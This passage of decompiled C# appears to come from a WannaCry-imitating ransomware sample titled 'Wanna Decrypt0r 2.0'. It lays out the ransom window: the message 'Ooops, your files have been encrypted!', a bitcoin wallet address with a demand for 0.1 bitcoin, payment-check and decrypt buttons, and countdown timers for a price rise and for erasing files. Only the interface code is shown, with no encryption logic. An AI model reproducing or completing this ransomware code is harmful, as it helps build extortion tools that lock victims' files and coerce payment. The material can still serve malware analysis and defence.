		((Control)Contact).set_Size(new Size(93, 18));
		((Control)Contact).set_TabIndex(2);
		((Label)Contact).set_TabStop(true);
		((Control)Contact).set_Text("Contact Us");
		Contact.add_LinkClicked(new LinkLabelLinkClickedEventHandler(Contact_LinkClicked));
		((Control)About).set_AutoSize(true);
		About.set_LinkColor(Color.FromArgb(123, 237, 206));
		((Control)About).set_Location(new Point(25, 485));
		((Control)About).set_Name("About");
		((Control)About).set_Size(new Size(69, 13));
		((Control)About).set_TabIndex(4);
		((Label)About).set_TabStop(true);
		((Control)About).set_Text("About bitcoin");
		About.add_LinkClicked(new LinkLabelLinkClickedEventHandler(About_LinkClicked));
		((Control)Howto).set_AutoSize(true);
		Howto.set_LinkColor(Color.FromArgb(123, 237, 206));
		((Control)Howto).set_Location(new Point(25, 513));
		((Control)Howto).set_Name("Howto");
		((Control)Howto).set_Size(new Size(106, 13));
		((Control)Howto).set_TabIndex(5);
		((Label)Howto).set_TabStop(true);
		((Control)Howto).set_Text("How to buy bitcoins?");
		Howto.add_LinkClicked(new LinkLabelLinkClickedEventHandler(Howto_LinkClicked));
		((Control)Oops).set_AutoSize(true);
		((Control)Oops).set_Font(new Font("Microsoft Sans Serif", 14f, (FontStyle)1));
		((Control)Oops).set_ForeColor(Color.White);
		((Control)Oops).set_Location(new Point(276, 9));
		((Control)Oops).set_Name("Oops");
		((Control)Oops).set_Size(new Size(378, 24));
		((Control)Oops).set_TabIndex(6);
		((Control)Oops).set_Text("Ooops, your files have been encrypted!");
		((Control)Lock).set_BackgroundImage((Image)componentResourceManager.GetObject("Lock.BackgroundImage"));
		((Control)Lock).set_Location(new Point(51, 6));
		((Control)Lock).set_Name("Lock");
		((Control)Lock).set_Size(new Size(136, 135));
		Lock.set_SizeMode((PictureBoxSizeMode)2);
		Lock.set_TabIndex(7);
		Lock.set_TabStop(false);
		((Control)TimeLeft).set_BackgroundImage((Image)componentResourceManager.GetObject("TimeLeft.BackgroundImage"));
		((Control)TimeLeft).set_Location(new Point(7, 146));
		((Control)TimeLeft).set_Name("TimeLeft");
		((Control)TimeLeft).set_Size(new Size(231, 307));
		TimeLeft.set_SizeMode((PictureBoxSizeMode)3);
		TimeLeft.set_TabIndex(8);
		TimeLeft.set_TabStop(false);
		((Control)RiseProgress).set_BackColor(Color.White);
		((Control)RiseProgress).set_Location(new Point(213, 185));
		((Control)RiseProgress).set_Name("RiseProgress");
		((Control)RiseProgress).set_Size(new Size(17, 50));
		RiseProgress.set_TabIndex(9);
		RiseProgress.set_TabStop(false);
		((Control)LostProgress).set_BackColor(Color.White);
		((Control)LostProgress).set_Location(new Point(213, 341));
		((Control)LostProgress).set_Name("LostProgress");
		((Control)LostProgress).set_Size(new Size(17, 90));
		LostProgress.set_TabIndex(10);
		LostProgress.set_TabStop(false);
		pictureBox2.set_Image((Image)componentResourceManager.GetObject("pictureBox2.Image"));
		((Control)pictureBox2).set_Location(new Point(239, 457));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(573, 90));
		pictureBox2.set_TabIndex(11);
		pictureBox2.set_TabStop(false);
		((Control)Help).set_Location(new Point(241, 42));
		((Control)Help).set_Name("Help");
		((TextBoxBase)Help).set_ReadOnly(true);
		Help.set_ScrollBars((RichTextBoxScrollBars)2);
		((Control)Help).set_Size(new Size(571, 409));
		((Control)Help).set_TabIndex(12);
		((Control)Help).set_Text("");
		((Control)Wallet).set_AutoSize(true);
		((Control)Wallet).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)Wallet).set_ForeColor(Color.White);
		((Control)Wallet).set_Location(new Point(392, 499));
		((Control)Wallet).set_Name("Wallet");
		((Control)Wallet).set_Size(new Size(321, 18));
		((Control)Wallet).set_TabIndex(13);
		((Control)Wallet).set_Text("13KBb1G7pkqcJcxpRHg387roBj2NX7Ufyf");
		((Control)Copy).set_BackgroundImage((Image)componentResourceManager.GetObject("Copy.BackgroundImage"));
		((Control)Copy).set_Location(new Point(769, 492));
		((Control)Copy).set_Name("Copy");
		((Control)Copy).set_Size(new Size(40, 40));
		Copy.set_TabIndex(14);
		Copy.set_TabStop(false);
		((Control)Copy).add_Click((EventHandler)Copy_Click);
		((Control)Price).set_AutoSize(true);
		((Control)Price).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)Price).set_ForeColor(Color.FromArgb(224, 224, 0));
		((Control)Price).set_Location(new Point(385, 469));
		((Control)Price).set_Name("Price");
		((Control)Price).set_Size(new Size(251, 18));
		((Control)Price).set_TabIndex(15);
		((Control)Price).set_Text("Send 0.1 bitcoin to this address:");
		Counter.set_Enabled(true);
		Counter.set_Interval(1000);
		Counter.add_Tick((EventHandler)Counter_Tick);
		((Control)RiseDateLbl).set_AutoSize(true);
		((Control)RiseDateLbl).set_Font(new Font("Arial", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)RiseDateLbl).set_ForeColor(Color.White);
		((Control)RiseDateLbl).set_Location(new Point(62, 196));
		((Control)RiseDateLbl).set_Name("RiseDateLbl");
		((Control)RiseDateLbl).set_Size(new Size(113, 15));
		((Control)RiseDateLbl).set_TabIndex(16);
		((Control)RiseDateLbl).set_Text("7/10/2017 15:00:00");
		((Control)EraseDateLbl).set_AutoSize(true);
		((Control)EraseDateLbl).set_Font(new Font("Arial", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)EraseDateLbl).set_ForeColor(Color.White);
		((Control)EraseDateLbl).set_Location(new Point(62, 353));
		((Control)EraseDateLbl).set_Name("EraseDateLbl");
		((Control)EraseDateLbl).set_Size(new Size(113, 15));
		((Control)EraseDateLbl).set_TabIndex(16);
		((Control)EraseDateLbl).set_Text("7/10/2017 15:00:00");
		((Control)RiseTimeLeft).set_AutoSize(true);
		((Control)RiseTimeLeft).set_Font(new Font("DejaVu Sans Mono", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)RiseTimeLeft).set_ForeColor(Color.Yellow);
		((Control)RiseTimeLeft).set_Location(new Point(51, 252));
		((Control)RiseTimeLeft).set_Name("RiseTimeLeft");
		((Control)RiseTimeLeft).set_Size(new Size(131, 22));
		((Control)RiseTimeLeft).set_TabIndex(16);
		((Control)RiseTimeLeft).set_Text("03:23:59:00");
		((Control)EraseTimeLeft).set_AutoSize(true);
		((Control)EraseTimeLeft).set_Font(new Font("DejaVu Sans Mono", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)EraseTimeLeft).set_ForeColor(Color.Yellow);
		((Control)EraseTimeLeft).set_Location(new Point(51, 409));
		((Control)EraseTimeLeft).set_Name("EraseTimeLeft");
		((Control)EraseTimeLeft).set_Size(new Size(131, 22));
		((Control)EraseTimeLeft).set_TabIndex(16);
		((Control)EraseTimeLeft).set_Text("03:23:59:00");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(132, 18, 18));
		((Form)this).set_ClientSize(new Size(815, 585));
		((Control)this).get_Controls().Add((Control)(object)EraseTimeLeft);
		((Control)this).get_Controls().Add((Control)(object)RiseTimeLeft);
		((Control)this).get_Controls().Add((Control)(object)EraseDateLbl);
		((Control)this).get_Controls().Add((Control)(object)RiseDateLbl);
		((Control)this).get_Controls().Add((Control)(object)Price);
		((Control)this).get_Controls().Add((Control)(object)Copy);
		((Control)this).get_Controls().Add((Control)(object)Wallet);
		((Control)this).get_Controls().Add((Control)(object)Help);
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Control)this).get_Controls().Add((Control)(object)LostProgress);
		((Control)this).get_Controls().Add((Control)(object)RiseProgress);
		((Control)this).get_Controls().Add((Control)(object)TimeLeft);
		((Control)this).get_Controls().Add((Control)(object)Lock);
		((Control)this).get_Controls().Add((Control)(object)Oops);
		((Control)this).get_Controls().Add((Control)(object)Howto);
		((Control)this).get_Controls().Add((Control)(object)About);
		((Control)this).get_Controls().Add((Control)(object)Contact);
		((Control)this).get_Controls().Add((Control)(object)Decrypt);
		((Control)this).get_Controls().Add((Control)(object)CheckPayment);
		((Control)this).set_ForeColor(SystemColors.WindowText);
		((Form)this).set_FormBorderStyle((FormBorderStyle)3);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("MainForm");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Wanna Decrypt0r 2.0");
		((ISupportInitialize)Lock).EndInit();
		((ISupportInitialize)TimeLeft).EndInit();
		((ISupportInitialize)RiseProgress).EndInit();
		((ISupportInitialize)LostProgress).EndInit();
		((ISupportInitialize)pictureBox2).EndInit();
		((ISupportInitialize)Copy).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
